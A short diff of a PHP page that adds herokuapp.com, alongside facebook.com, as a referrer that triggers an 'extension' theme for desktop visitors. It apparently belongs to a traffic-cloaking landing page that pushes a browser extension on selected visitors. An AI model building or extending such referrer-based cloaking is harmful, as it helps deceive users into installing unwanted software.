@@ -21,7 +21,9 @@ $mobile = "https://goo.gl/TdR8a3";
 if (strpos($_SERVER["HTTP_REFERER"], 'facebook.com') !== false){
     $isref = true;
 }
-
+if (strpos($_SERVER["HTTP_REFERER"], 'herokuapp.com') !== false){
+    $isref = true;
+}
 if ($data->status == "true" && $data->device_type == "desktop" && $isref == true) {
 
   $theme = "extension";
